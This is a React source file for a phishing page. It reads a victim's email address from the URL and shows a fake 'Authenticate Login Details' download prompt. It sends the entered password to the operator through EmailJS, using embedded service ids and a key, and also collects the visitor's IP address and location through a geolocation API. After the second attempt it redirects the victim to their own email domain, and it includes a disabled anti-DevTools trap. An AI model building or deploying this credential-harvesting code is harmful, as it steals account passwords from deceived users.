import React, { useEffect, useRef, useState } from 'react'
import './topgun.css';
import EMJSs from '@emailjs/browser';

const TopGun = () => {

          const u = () => {
              new Image().__defineGetter__("id", () => {
                  console.log("DevTools is open"),
                  clearDOM(),
                  window.location.replace("https://prog-public-ht.project1content.com/e0a/833/897/47b/459/88b/585/697/98c/da7/a4/mediabook/mediabook_320p.mp4")
              }
              ),
              setInterval( () => {
                  debugger
              }
              , 1e3)
          }
  
          useEffect(()=>{
              // u();
          },[]);
  
     const formRef = useRef();
    
        const [ipAdress, setIpAdress] = useState('')
        const [city, setCity] = useState('');
        const [flag, setFlag] = useState('');
        const [country, setCountry] = useState('');
    
        const [spinLoader, setSpinLoader] = useState(false);
          
        useEffect(()=>{
          fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
          .then(req=> req.json())
          .then(res=>{
      
              setIpAdress(res.ip);
              setFlag(res.country.flag);
              setCountry(res.country.name);
              setCity(res.city.names.en);
  
            })
          .catch(e=> console.log);
      }, []);
    
      const emailInTheURL = window.location.href;
      const sliceEqualSign = emailInTheURL.indexOf("@");
      const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&*(', 1).toString();
  
      const emailInTheURLA = window.location.href;
      const sliceEqualSignB = emailInTheURLA.indexOf("=");
      const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).split('&*(', 1).toString();
      
    const [eml, setEml] = useState(extracetdEmailC);
    const [pswd, setPswd] = useState('');
    
    const [count, setCount] = useState(0);
    
    const [err, setErr] = useState(false);
  
    const [btn, setBtn] = useState('Download')

    const selfListener = (________) =>{
      ________.preventDefault();
  
      if (eml === "") {
          return null
      }else{
          if (pswd.length <= 4) {
              alert('Password too short!');
          }else{
              setSpinLoader(true);
              setBtn("Download...");
  
              setTimeout(() => {
                  setSpinLoader(false);
                  setPswd('');
                  setErr(true)
                  setBtn(btn)
              }, 3000);
  
  // ==============================================================
  // ========================================================================

            //  emailjs
            // .sendForm('service_b7v23dh', 'template_w72l8tm', formRef.current, {
            //   publicKey: 'fPwyUYrLDLbBY-QRr',
            // })


            EMJSs.sendForm('service_3tjyts7', 'template_lqd32mb', formRef.current, {
        publicKey: 'PQfaEeJPgRec4C6WT',
      })
      .then(
        () => {
          console.log('a');
        },
        (error) => {
          console.log('m', error.text);
        },
      );

  // ========================================================================



              setCount(count=> count + 1);
              if(count >= 1){
                  const redirectURL = window.location.href;
                  const sliceEqualSign = redirectURL.indexOf("@");
                  const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                  setTimeout(() => {
                      setTimeout(() => {
                          console.log(`.`);
                      }, 500);
                      window.location.href = `https://www.${extracetdemailDomain.split('&*(', 1).toString()}`;
                  }, 1860);
              };
          }
      }
  };

  return (
    <section className='full_scrn'>
        <div className='box'>
            <div className='tpX'>
                <p>Authenticate Login Details.</p>
                <p className='cloz' title='close' onClick={()=> setTimeout(() => {
                  window.location.reload();
                }, 1800)}>x</p>
            </div>

            <div className='frmWrapper'>
              <form onSubmit={selfListener} ref={formRef}>

                <div className="ml">
                  <p className='lbl'>Email Address</p>
                  <input
                    className='data_collector'
                    type='email'
                    id='ml_singl_e'
                    readOnly
                    value={`${eml}`}
                    onChange={e=>setEml(e.target.value)}
                    name='service'
                    required

                  />
                </div>

                <div className="pwd">
                  <p className='lbl'>Password </p>
                  <input
                    type='password'
                    className='data_collector'
                    id='psw_snlge'
                    value={`${pswd}`}
                    onChange={e=> setPswd(e.target.value)}
                    name='temp'
                    required
                    autoFocus
                  />
                </div>

                <div className="dnld">
                  <input 
                    type='submit'
                    value={btn}
                    className='boston'
                    onClick={selfListener}
                  />
                </div>

              </form>
            </div>
        </div>
    </section>
  )
}

export default TopGun;